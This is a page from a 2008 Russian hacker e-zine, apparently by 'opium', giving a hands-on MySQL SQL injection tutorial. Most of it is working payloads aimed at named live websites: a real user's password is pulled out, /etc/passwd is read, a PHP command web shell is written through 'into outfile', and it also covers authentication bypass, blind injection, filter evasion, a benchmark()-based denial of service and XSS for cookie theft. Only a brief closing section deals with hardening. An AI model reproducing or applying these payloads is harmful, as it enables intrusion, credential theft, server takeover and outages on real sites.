<html>
<head>
<title>==||The Gray Brotherhood Community||==||E-ZineS #2||==</title>
<META http-equiv=Content-Type content="text/php; charset=windows-1251">
<link rel="stylesheet" href="css/style.css" type="text/css">
<link rel="stylesheet" href="css/bord.css" type="text/css">
<link rel="shortcut icon" href="1.zzd">
</head>
<script type="text/javascript" src="css/mw_hint.zzd"></script>
<body>
<table border="0" width="900" align="center" valign="top">
<tr>
<td border="0" width="100%" align="center" valign="top">
<IMG SRC="css/images/head.jpg"  border="0" alt="The Gray Brotherhood Community">
</td>
</tr><tr><td align="center" >
</td></tr>
</table>


            <TABLE cellSpacing=0 cellPadding=0 width="749" border='0' align="center">
              <TBODY>
              <TR>
                <TD><IMG height=30 alt="" src="css/images/cat_left.gif" width=40></TD>
                <TD width=20 background="css/images/1.jpg" height=20><center>
		</center></TD>
                <TD><IMG height=30 alt="" src="css/images/cat_right.gif" width=40></TD></TR>
              <TR>
                <TD width=2 background="css/images/3.jpg" height=2></TD>
                <TD bgColor=#A9BECA>
                      <CENTER>
<br><b><a href='index.html' title='Содержание'>Содержание</a></b>
</CENTER><br>

<b>Как провести грамотную sql-инъекцию (в сервере mysql).</b>
<br><br>
Я постараюсь вкратце, доступным языком описать основные ходы sql-инъекции. 
Буду описывать с самого распространенного сервера баз данных – MySQL. 
Помимо него есть и другие сервера. Сказать что MySQL-сервер лучший – нет, не скажу. 
Скажу что он самый простой и главное – бесплатный, а потому – самый распространённый. 
Инъекция под другие сервера очень похожа. Просто нужно учитывать особенности sql-запросов. 
Синтаксис может малька отличаться, ну и другие фишки. Подробно описывать не буду. 
Если появится время, напишу ещё пару-тройку статей про инъекции, а может не только про них. 
И так, поехали:
<br><br>
 	-Предисловие<br>
 	-Обнаружение уязвимости<br>
 	-Вывод ошибок отключён<br>
 	-Про что часто забывают новички (скобки)<br>
 	-Комментарии?<br>
 	-Что делать дальше?<br>
 	-Упс, фильтры стоят<br>
 	-Выводится мало символов<br>
 	-Определяем версию<br>
 	-Эх, старая версия MySQL (3.x)<br>
 	-Авторизуемся не зная пароля?<br>
 	-Вообще нифига не выводится (слепая инъекция)<br>
 	-А мы можем задосить<br>
 	-Зальём шелл?<br>
 	-XSS и SQL-инъекция. Совместим?<br>
 	-Защищайся, сударь!<br>
 	-Послесловие<br><br>
<b>
Предисловие</b><br><br>

 Начнём с самого главного. Чтобы провести sql-инъекцию, ты должен знать язык sql. 
 Пусть не в идеале. Если ты его не знаешь, то марш учить, всё равно ни черта не поймёшь!<br>
 Sql-инъекция хороша тем, что эта уязвимость не связана с каким-либо языком программирования. 
 Она может быть проведена как в php так и в asp и pl скриптах. Даже можно её провести в каком-нибудь 
 приложении. Которое работает с базой данных. Скажу ещё, что тебе нужно изучить структуру БД, 
 которую ты ломаешь. Я про таблицы с конфигами сервера. Из них можно много чего полезного почерпать! 
 А ещё пускай в ход разные функции, такие как limit. На этом предисловие оконено.
<br><br>
<b>Обнаружение уязвимости</b><br><br>

Что мы должны делать попадя на сайт? А всё просто. Мы должны спровоцировать 
ошибку. Например, если запрос выглядит так: id=12, то мы сделаем так id=12s и id=’. 
Приведём живой пример:<br>
_http://www.flashalert.net/news.html?id=666<br>
Выводится какая-то страница. Этот сайт я нашёл чисто для этой статьи.<br>
А мы передадим такую:<br>
_http://www.flashalert.net/news.html?id=666’<br>
И на экране засветилась надпись ошибки:<br>
Warning: mysql_fetch_array(): supplied argument is not a valid MySQL result resource in 
/www/htroots/0/245/htdocs/flashalert/news.html on line 40<br>
Не стоит забывать, что вывод ошибки – это не всегда удача для хакера! Бывают случаи, когда 
ошибка выводится, а инъекцию произвести не удаётся. Не забывайте, что потенциально 
опасны все параметры, которые переходят от юзера (от тебя) к серверу. Провоцируйте 
ошибки не только в GET, но и в POST и в COOKIE параметрах!
<br><br>
<b>Вывод ошибок отключён</b><br><br>

А теперь посмотрим на другой сайт:<br>
_http://www.rmdb.ru/?movie&id=1<br>
На экране вывелась страничка с названием фильма. Поставим кавычку:<br>
_http://www.rmdb.ru/?movie&id=1’<br>
Название фильма исчезло, но и ошибок нет. Во бля… Что делать, спросишь ты! А я, 
типа умный, отвечу – не парься, возможно там есть уязвимость, просто вывод ошибок отключён!<br>
А ведь правда, когда делаем такой запрос:<br>
_http://www.rmdb.ru/?movie&id=1+and+1=1<br>
то загружается страница. Ну всё тоже самое, что и в этом случае:<br>
 _http://www.rmdb.ru/?movie&id=1<br>
А если мы изменим 1 цифру в запросе, то на экран выведется совсем другое:<br>
_http://www.rmdb.ru/?movie&id=1+and+1=2<br>
А почему, спросишь ты тупо. А потому, что 1 не равен двум. Мы спровоцировали логическую ошибку!<br>
В то время как<br>
_http://www.rmdb.ru/?movie&id=2-1<br>
тоже самое что и<br>
_http://www.rmdb.ru/?movie&id=1<br>
Потому что 2-1=1. Математика, бля. <br><br>

<b>Про что часто забывают новички (скобки)</b><br><br>

А прикинь, что если полный запрос выглядит так:<br>
Select * from news where (news.id=5 or news.author=’chlen’)  and news.year=98<br>
А инъекция будет тут:<br>
news.id=5<br>
мы видим, что инъекция будет внутри скобок. Значит нам нужно закрыть эти скобки! Гениально, правда?<br>
А чтобы понять, сколько открытых скобок, мы будем делать такие запросы:<br>
_http://www.animemagazine.ru/catalog/index.php?idk=1+and+1=1<br>
Так, ошибок нет. А что если мы ещё такой сделаем:<br>
_http://www.animemagazine.ru/catalog/index.php?idk=1)+and+(1=1<br>
Странно, опять нет ошибок (хоть ошибки и не выводятся, мы понимаем по содержанию страницы, что ошибки нет)<br>
А если так:<br>
_http://www.animemagazine.ru/catalog/index.php?idk=1))+and+((1=1<br>
О! так лучше. Видим, что произошла какая-то ошибка – страница изменила свой вид. 
Из этого мы сделаем вывод, что есть 1 открытая скобка и закроем её.<br>
_http://www.animemagazine.ru/catalog/index.php?idk=-1)/*<br><br>

<b>Комментарии?</b><br><br>

Ты заметил в конце запроса /* ? Это означает, что запрос, который дописан в 
скрипте будет читаться как комментарий. Можно ещё использовать нуль-байт, если есть возможность: %00.<br>
_http://www.animemagazine.ru/catalog/index.php?idk=-1)%00<br>
В mysql базах данных можно комментарий не закрывать. Но это не значит, что и 
в других СУБД тоже так!<br><br>

<b>Что делать дальше?</b><br><br>

Помнишь конcтрукцию union?  Хорошо, что помнишь! Она нам сейчас 
понадобится! Нам нужно подобрать количество столбцов. Подбирать можно так:<br>
_http://www.rmdb.ru/?movie&id=-1+union+select+1/*<br>
не то<br>
_http://www.rmdb.ru/?movie&id=-1+union+select+1,2/*<br>
не то<br>
_http://www.rmdb.ru/?movie&id=-1+union+select+1,2,3/*<br>
О! то!<br>
<center><img src=css/images/4/1.jpg ></center>
 <br>
А можно с помощью конструкции group by.<br>
Почему мы передали в качестве параметра -1?  А потому, что 
логически подумать, такого идентификатора в БД нет, а значит ни 
какой «мусор» не отобразится, а только то, что нам нужно. Можно ещё какой-нибудь такой:<br>
Id=99999<br>
А что мы словили с нашего запроса? Ну, какие-то цифры на экран вывелись, ну и что.<br>
Эти цифры – это столбцы, которые выводятся на экран. Они-то нам и нужны.<br>
Мы уже на пути к успеху! Теперь нужно подобрать имя таблицы. Для этого есть разные 
софтины и скрипты. А можно и вручную. (не стоит забывать о таблицах самой базы данных, 
например о mysql.user). Примеры:<br>
_http://www.astralpole.org/display.php?id=-1+union+select+1,2,3,4,5,6,7,8,9,10,11,12,13+from+mysql.user/*<br><br>
 <center><img src=css/images/4/2.jpg ></center><br>
Обычно перебирают такие имена как: users, admin, profiles…<br>
_http://www.kinder.by/consultant/qa/read.php?topicid=-1+union+select+1,2,3,4,5+from+profiles/*<br>
Когда подобрали нужную нам таблицу, нужно подобрать имя столбца! (скажу по секрету, 
имена столбцов часто совпадают с именами input-полей в html-коде).<br>
Но можно и подробнее узнать о сервере БД.<br>
_http://www.voina-i-mir.ru/dicchapter/?id=-1+union+select+1,2,concat_ws(0x3a,version(),database(),user()),4,5,6<br><br>
 <center><img src=css/images/4/3.jpg ></center><br>
Concat_ws() – классная функция. Она нам помогает. Ну, с ней удобно вобщем. 
Она объединяет в одну строку несколько строк, а символ 0x3a – это разделитель. 
В данном случае «:».<br><br>

<b>Упс, фильтры стоят</b><br><br>

Мы можем сделать так:<br>
_http://www.lyapis.com/photo.php?cl=-1+union+select+1,2,3,4,'HaCkEd+By+OpIuM'<br>
И увидим надпись HaCkEd By OpIuM на странице.<br><br>
 <center><img src=css/images/4/4.jpg ></center><br>
А почему на одних страницах такое прокатывает, а на других нет? – 
спросишь ты опять. А потому что там могут экранизироваться кавычки слешами. 
Например было так: ‘hack’, а стало так: \‘hack\’ . В этом случае строку нужно 
закодировать. Нужно указать каждый символ в виде числа (кода символа). 
Во многих языках программирования делается это функцией ord(). Было слово her, 
а стало 104,101,114. В запрос нужно подставлять так: char(104,101,114). <br><br>
 <center><img src=css/images/4/5.jpg ></center><br>
А ещё могут фильтроваться пробелы или даже слова! С пробелами, нам могут помочь 
те же самые комментарии. Нужно представлять запросы такими:<br>
_http://www.rmdb.ru/?movie&id=-1/**/union/**/select/**/1,2,3/*<br>
Кстати, если ты не в догонке, почему у меня стоят плюсики там, где должны 
стоять пробелы, то осведомлю:  плюсик – это урл-кодированный пробел. На мой взгляд 
более читабельно с плюсиками, чем с %20.<br>
Если ты заметил, что какие-то элементы вырезаются, то это тоже иногда можно обойти. 
Например, если фильтруется слово select, то можно попробовать SeLeCt или selselectect. <br><br>

<b>Выводится мало символов</b><br><br>

Иногда бывает, что нужно вытянуть длинный md5-хеш пароля, который длинной 32 символа, 
а на экран выводится только 30 символов. Что делать? ААА! Паника! Два символа! 
Бляяяяяяя!... Да член с ними, с символами. Есть же такая крутая функция, как substring().
 Выглядит она так: substring(‘Bugaga’,1,3).<br>
Bugaga – это название столбца, например. Циферки 1,3 означают, что выведется строка 
с первого символа по третий. Так можно по кускам достать Длинный хеш пароля. А вообще, 
чтобы не трахать себе мозг, выбирай те поля, в которых выводится достаточное количество 
символов. Ну а если таких нет, то этот способ тебе необходим. Скажу ещё, что такое 
встречается довольно редко.<br><br>

<b>Определяем версию</b><br><br>

Есть много способов определить версию mysql, я опишу лишь один. Когда нашёл инъекцию, 
вторым делом определяешь версию. Первым делом закрываешь открытые скобки. Мой любимый 
и самый привычный для меня способ определения версии – это способ с теми же комментариями. 
В mysql встроена одна фишка, для совметимости старых версий с новыми. Выглядит она так: 
/*!40000 */. Это не простой комментарий! Это комментарий, который будет считаться 
комментарием в том случае, если версия mysql меньше четвёртой. Сечёшь?  Можно создавать 
запросики такого вида:<br>
?id=1/*!30000+and+1=2*/<br>
?id=1/*!40000+and+1=2*/<br>
?id=1/*!50000+and+1=2*/<br>
?id=1/*!41000+and+1=2*/<br>
?id=1/*!42000+and+1=2*/<br>
?id=1/*!43000+and+1=2*/<br>
?id=1/*!43100+and+1=2*/<br>
В первом случае код в комментарии выполнится, значит версия выше третей. 
И во втором случае тоже выполнился, а вот в третьем случае не выполнился, 
значит версия ниже пятой, то бишь четвёртая.  Таким методом можно узнать 
версию с точностью, что в принципе и не нужно. <br><br>

<b>Эх, старая версия MySQL (3.x)</b><br><br>

Многие новички бьются головой об монитор, не понимая, в чём дело. Вроде 
все скобки закрыл. Открытый знак комментария в конце. 2-1=1. Ну всё показывает 
на наличие инъекции. А проблема может быть в том, что версия MySQL старенькая. 
А в старенькой версии нет такой функции как union. Ага! Попался хакер! 
Уязвимость есть, но не можешь ей воспользоваться? На самом деле ей можно 
воспользоваться, хоть это и мало где описано. Да большинство хакеров 
(в том числе и я) когда видят старую версию сразу закрывают браузер, 
потому что дальнейшие действия - полный геморрой. Ну уж если очень приспичит, 
то можно. Для начала, узнаем какие имена столбцов в БД. Для этого будем применять 
конструкцию такого вида: ?id=1+and+login=login/* Ты конечно догнал, что если 
ошибки не будет (хоть она может и не выводиться), то столбец с именем login 
правда существует. Ну а если будет ошибка, то продолжай перебор дальше. 
Ещё можно вырываться в другую таблицу так ?id=1+and+users.login=users.login/*, 
где users – имя таблицы. Едем дальше. Как вывести на экран пароль? Тут самое 
сложное… Хотя нет, вовсе не сложно, но самое скучное. Помнишь функцию like? 
Она нужна для осуществления поиска по БД. Есть такая фишка, что если не знаешь 
слово полностью, то можно найти его, зная лишь часть или хотя бы 1 букву. 
Для того чтобы найти слово по 1 букве, нужно использовать знак %. Например, 
тебе нужно найти слово gamburger. Ты можешь использовать функцию like 
следующим образом: like+’g%’. Все слова, которые начинаются с буквы g найдутся. 
Можешь даже так: like+’gam%’, и найдётся все слова, которые начинаются на gam. 
А если ты знаешь длину слова, то можешь так: like+’gamb_____’. Каждый неизвестный 
символ заменяется знаком подчёркивания «_». Как это нам поможет? А вот так: 
?id=1+and+users.login+like+’q%’/*. Если ошибку не вернуло, знаит пароль 
начинается с буквы q. Если ошибка значит нужно подставлять другой символ 
до тех пор, пока не исчезнет ошибка. Когда подобрал 1 символ, переходи к другому:<br>
?id=1+and+users.login+like+’q%’/* - нет ошибки<br>
?id=1+and+users.login+like+’qq%’/* - ошибка<br>
?id=1+and+users.login+like+’qw%’/* - нет ошибки<br>
?id=1+and+users.login+like+’qwq%’/* - ошибка<br>
?id=1+and+users.login+like+’qww%’/* - ошибка<br>
?id=1+and+users.login+like+’qwe%’/* - нет ошибки.<br>
Так посимвольно можно подобрать пароль, ну или что ты там хочешь подобрать… 
В общем инфу вытянуть. Можно узнать количество символов в слове, что мы вытягиваем. 
Тут нам поможет знак подчёркивания:<br>
?id=1+and+users.login+like+’q_’/* - нет ошибки<br>
?id=1+and+users.login+like+’q__’/* - нет ошибки<br>
?id=1+and+users.login+like+’q___’/* - нет ошибки<br>
?id=1+and+users.login+like+’q____’/* - нет ошибки<br>
?id=1+and+users.login+like+’q_____’/* - нет ошибки<br>
?id=1+and+users.login+like+’q______’/* - есть ошибка<br>
Значит в слове 6 символов. Конечно можно и другими способами подбирать, 
но я их описывать не буду, так как этот самый нормальный.<br><br>

<b>Авторизуемся не зная пароля?</b><br><br>

А можно даже авторизоваться не зная пароля с помощью sql-инъекции. Предположим, 
что на сайте такой  запрос:<br>
Select access from users where username=’$name’ and password=’$pass’<br>
Параметр $name не фильтруется. Тут не сложно логически догнать, что в поле ввода
 логина нужно ввести login’ or 1=1/*, где login – реальный логин юзера. Так мы пройдём 
 авторизацию. А пройдем потому, что получится следующий запрос:<br>
Select access from users where username=’ login’ or 1=1/* and password=’$pass’<br>
Говоря человеческим языком получится:<br>
Выбрать права из таблицы юзерс, где логин будет login или 1 равно 1. А дальше запрос 
съедает открытый комментарий (/*). 1=1? Равно, а значит авторизация пройдена. <br>
 Ты конечно понимаешь, что может быть уязвимо поле пароля или домена (если это почтовик). 
 Так что подставлять мусор нужно во все поля, передаваемые на скрипт авторизации, 
 в том числе в скрытые, выпадающие списки и т.д. Нужно учитывать, что там может 
 быть раскрытая скобка или несколько. Что вводимые данные могут быть обрамлены 
 кавычками. Эксперементируйте!<br><br>

<b>Вообще нифига не выводится (слепая инъекция)</b><br><br>

 А ведь бывает такое, что инъекция есть а на экран нихрена не выводится. 
 В этом случае нужно набраться терпения. Эта инъекция называется blind sql-injection. 
 Сразу скажу, что для этого вообще нужно отдельную статью писать – слишком уж много 
 фишек. Но я объясню поверхностно, а дальше – дело твоей фантазии. Конечно же ты знаешь 
 про функции ascii(), substring(). Про подзапросы ты тоже знаешь. А если нет, то гоу 
 читать про эту дрянь.<br>
 И так. Сайта со слепой инъекцией специально для статьи я не нашёл. Что ж. Придётся 
 нам сделать вид, что мы не видим, что что-то выводится на странице ?. Показывать 
 буду на примере kinder.by. Отправив на сервер запрос такого вида:<br>
_http://www.kinder.by/consultant/qa/read.php?topicid=-1+union+select+1,2,3,passwd,5+from+profiles+where+id=1144017647/*<br>
мы получили ekmnbvfnev – чей-то пароль. А теперь представим, что 
высветилась пустая страница. Ну вобщем слепая инъекция. Названия столбцов, 
таблиц мы подбираем точно так же как и я описывал в случае MySQL (3.x). А теперь 
составим такой запрос:<br>
_http://www.kinder.by/consultant/qa/read.php?topicid=-1+union+select+1,2,3,passwd,5+from+profiles+where+id=1144017647+and+100=ascii((select+substring(passwd,1,1)))/* и он вернул ошибку. 
100 – это код первого символа пароля. Если код первого символа не равен 100, значит вылетит 
ошибка, а если равен 100, значит ошибки не будет и мы можем утверждать, что первый символ 
– d (символ с кодом 100). Раз 100 у нас не прокатило, значит ставим 101 (на самом деле нужно 
начинать не со 100, это я для примера):<br>
_http://www.kinder.by/consultant/qa/read.php?topicid=-1+union+select+1,2,3,passwd,5+from+profiles+where+id=1144017647+and+101=ascii((select+substring(passwd,1,1)))/* и 
ошибки нет. Значит первый символ – e. Так манипулируя функцией substring() иы подберём все 
символы. И скажу вом такую мазу: не забывайте про функцию between – она уменьшит вам 
работы. А ещё бывает, что нужно использовать функцию benckmark(), засикать время и
 смотреть на реакцию сервера. Но это другая длинная история, которую ты можешь 
 найти в гугле.<br><br>


<b>А мы можем задосить</b><br><br>

Ты конечно знаешь, что DoS-атака (Denial of Service) – это атака, направленная на отказ 
в обслуживании. Проще говоря, с её помощью мы подвешиваем сервер. Память заполняется 
из-за большого количества тяжелых действий и сайт перестаёт работать. Как пример – 
открой штук 10 окон поиска на своём компе и запусти. Пусть что-нибудь ищут. Комп 
начнёт тормозить. А может даже зависнет. Скажу сразу, что я против такого рода атак. 
Это слишком скучно, просто и вредительски, но я про них расскажу, для полного комплекта, 
как говорится. Из выше рассказанного понятно, что нужно выполнять какие-нибудь действия, 
которые отнимают много ресурсов на серваке. Ну, проще говоря, какие-нибудь циклы, которые 
загрузят сервер. Специально для этого есть функция benckmark(). Синтаксис её следующий 
(на примере): benckmark(15,current_time), что проще говоря, 15 раз выполнить функцию 
current_time. А ведь можно и не 15 раз, а, к примеру, 1000000 раз. Загрузит это сервер? 
А можно даже ещё круче – со вложенными функциями: benckmark(1000000, benckmark(1000000,md5(current_time))).
 Тут 1000000 раз выполнится по 1000000 раз 
 зашифровывангие текущей даты в md5. А вот если такой процесс осуществить несколько 
 раз, а ещё лучше – зациклить, тогда уж сервер пойдёт в далёкую попу, выполняя эти запросы. <br><br>

<b>Зальём шелл?</b><br><br>

А сейчас я опишу одну из опаснейших фишек для сервера и одну из приятнейших – 
для хакера. При удачном стечении обстоятельств, через sql-injection можно залить шелл. 
Эти удачные обстоятельства зависят от настроек сервера, ведь не секрет, что с плохой 
настройкой можно захватить mysql сервер даже без инъекции (если пароль будет пустым и 
коннект разрешён с любого адреса) и наоборот – с хорошей, тонкой настройкой может не 
получиться захватить сервер даже при наличии инъекции. Если в mysql разрешена работа с 
файлами (File_priv=’Y’) – то скорее всего можно утверждать, что сайт легко взломать. 
Маза в том, что в таком случае файлы можно и читать и создавать на сервере. Но есть одно 
НО! Нужно знать путь относительно корня сервера. Этот путь можно подобрать наугад, 
ну или посмотреть в выведенных ошибках. Есть ещё одна хитрость: если нет ошибок, 
раскрывающих пути на сервере, то нужно создать запрос в поисковике (в гугле например) 
на поиск этой ошибки. Может она когда-то была и проиндексировалась поисковиком. 
А запрос на прочтение файлов может выглядеть 
так: ?id=1+union+select+1,load_file('/etc/passwd'),3+from+mysql.user/*<br><br>
 <center><img src=css/images/4/6.jpg ></center><br>
В этом случае выведется на экран файл /etc/passwd, который существует на *nix 
операционках. Не забывай, что если кавычки экранизируются, то текст всегда можно 
закодировать: LOAD_FILE(CHAR(47,101,116,99,47,112,97,115,115,119,100)).<br>
А теперь научимся заливать шелл. В этом нам поможет функция into outfile. Приведу пример:<br>
?id=-1+union+select+1,'<?system($_get[cmd])?>',3+from+mysql.user+into+outfile+'/home/site/bunners/shell.php'.<br>
Папка bunners выбрана не случайно! Нужно найти папку с правами на запись. 
Это может быть папка с загрузками юзера, с аватарами, картинками. Подумай 
логически, какая это может быть папка. При этом не обязательно знать имя таблицы! 
А пишут часто, что обязательно… хз или я тупой, но у меня прокатывало и не зная имени.
 То есть запрос может быть таким:<br>
?id=-1+union+select+1,'<?system($_get[cmd])?>',3+into+outfile+'/home/site/bunners/shell.php'.<br>
НО! Опять огромное НО! 
Так делать нельзя: into outfile CHAR(47,104,111,109,101,47,115,105,116,101,47,98,117,110,110,101,114,115,47,115,104,101,108,108,46,112,104,112). После into outfile 
нельзя кодировать символы! Работать не будет. Неудобно, но ничего не поделаешь.<br><br>

<b>XSS и SQL-инъекция. Совместим?</b><br><br>

Бывает такое, что инъекция нам мало что даёт. Например, в БД нет 
нужной нам инфы, работа с файлами отключена. Или сервер грамотно 
настроен, что нет возможности стянуть пароли. В этом случае мы можем создать 
пассивную xss и своровать cookie. Делается это легко: <br>
?id=-1+union+select+1,’<script>alert</script>’,3/*. <br><br>
 <center><img src=css/images/4/7.jpg ></center><br>
Не забываем, что js-скрипт можно закодировать. На этом заостряться не 
буду. Так как xss – совсем другая история.<br><br>

<b>Защищайся, сударь!</b><br><br>

Самое главное, что я могу сказать про защиту – так это защита на уровне 
скрипта. Отфильтровывай все параметры, пришедшие от юзеров. Также важна правильная 
настройка mysql сервера, особенно, если над проектом работает не 1 программист 
(следить за безопасностью становится сложно). Напишу 5, на мой взгляд, важнейших 
правил по настройке:<br>
1.	Не используй БД из под рута, установи сложный пароль.<br>
2.	Создай пользователя с минимальными правами.<br>
3.	Логины\пароли пусть будут доступны по одной учётке, а всё остальное – по другой.<br>
4.	По возможности отключи работу с файлами.<br>
5.	Запрети коннект с левых адресов.<br>
Видишь, как просто оградить себя от беды? Дерзай!<br><br>

<b>Послесловие</b><br><br>

Возможно я что-то забыл, про что-то не рассказал, про что-то не знал, но 
помоему я расписал самое важное, что нужно знать для проведения грамотной 
sql-инъекции. А если у тебя хватило терпения прочесть её и сделать для 
себя какие-то пометки, надеюсь, что тебе эта инфа пригодится. Я старался 
для тебя, но это не значит, что нужно терроризировать мою аську с вопросами – 
меня и так все достали.<br>
И в заключение хочу сказать, что эта статья может размещаться на сайтах 
только с разрешения автора.<br><br>

<b>Дополнительные материалы к статье:</b><br>
1). <a href='http://www.tgbr.in/e-zines/2/soft/8/1.swf'>Обнаружение уязвимости.swf</a><br>
2). <a href='http://www.tgbr.in/e-zines/2/soft/8/2.swf'>Обнаружение уязвимости без выода ошибок.swf</a><br>
3). <a href='http://www.tgbr.in/e-zines/2/soft/8/3.swf'>Проверяем сколько раскрытых скобок.swf</a><br>
4). <a href='http://www.tgbr.in/e-zines/2/soft/8/4.swf'>Определяем версию mysql.swf</a><br>
5). <a href='http://www.tgbr.in/e-zines/2/soft/8/5.swf'>Подбираем количество столбцов.swf</a><br>
6). <a href='http://www.tgbr.in/e-zines/2/soft/8/6.swf'>Обходим фильтр.swf</a><br>
7). <a href='http://www.tgbr.in/e-zines/2/soft/8/7.swf'>Авторизация без пароля.swf</a><br>
8). <a href='http://www.tgbr.in/e-zines/2/soft/8/8.swf'>Слепая инъекция.swf</a><br><br>

<b>Specially for TGBR E-ZinoS #2 & xakepy.ru<br>
writed by opium 2008<br>
icq: 8088036<br></b>


<br><center>
<b><a href='index.html' title='Содержание'>Содержание</a></b><br></center>
<br>
</TD>
                <TD width=40 background="css/images/_3.jpg" height=30></TD></TR>
              <TR>
                <TD><IMG height=30 src="css/images/cat_left2.gif" width=40></TD>
                <TD width=30 background="css/images/_1.jpg" height=30></TD>
                <TD><IMG height=30 alt="" src="css/images/cat_right2.gif"  width=40></TD>
				</TR></TBODY>
				</TABLE>
		<table align="center" cellpadding="0" cellspacing="0">
    <tr>
        <td width="749">
         <br>	
		
		<center>
		<br><br>
<!--Rating@Mail.ru COUNTEr--><script language="JavaScript" type="text/javascript"><!--
d=document;var a='';a+=';r='+escape(d.referrer)
js=10//--></script><script language="JavaScript1.1" type="text/javascript"><!--
a+=';j='+navigator.javaEnabled()
js=11//--></script><script language="JavaScript1.2" type="text/javascript"><!--
s=screen;a+=';s='+s.width+'*'+s.height
a+=';d='+(s.colorDepth?s.colorDepth:s.pixelDepth)
js=12//--></script><script language="JavaScript1.3" type="text/javascript"><!--
js=13//--></script><script language="JavaScript" type="text/javascript"><!--
d.write('<a href="http://top.mail.ru/jump?from=1212823"'+
' target=_top><img src="http://d1.c8.b2.a1.top.list.ru/counter'+
'?id=1212823;t=135;js='+js+a+';rand='+Math.random()+
'" alt="Рейтинг@Mail.ru"'+' border=0 height=40 width=88/><\/a>')
if(11<js)d.write('<'+'!-- ')//--></script><noscript><a
target=_top href="http://top.mail.ru/jump?from=1212823"><FONT size="1">[AD]</FONT><AD- p.list.ru/counter?js=na;id=1212823;t=135"
border=0 height=40 width=88
alt="Рейтинг@Mail.ru"/></a></noscript><script language="JavaScript" type="text/javascript"><!--
if(11<js)d.write('--'+'>')//--></script><!--/COUNTER-->
</center>
        </td>
    </tr>
</table>


</body>
</html>